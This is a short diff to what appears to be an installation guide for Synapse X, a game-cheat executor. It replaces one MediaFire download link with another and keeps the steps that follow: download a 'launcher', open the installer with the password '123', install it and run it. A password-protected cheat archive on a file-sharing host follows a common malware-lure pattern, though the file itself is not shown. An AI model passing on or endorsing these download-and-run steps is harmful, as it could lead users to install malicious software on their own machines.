@@ -23,7 +23,7 @@ This concludes the general user guide for Synapse X. If you want to develop your
 
 
 
-Download here:https://www.mediafire.com/file/qy8a20kxxdxegls/Synapse_X_Launcher.rar/file
+Download here:https://www.mediafire.com/folder/0851l1scnz2j0/Synapse-X-Launcher
 Run the installation file ( password:123)
 Wait for the program to be fully installed
 Run the program
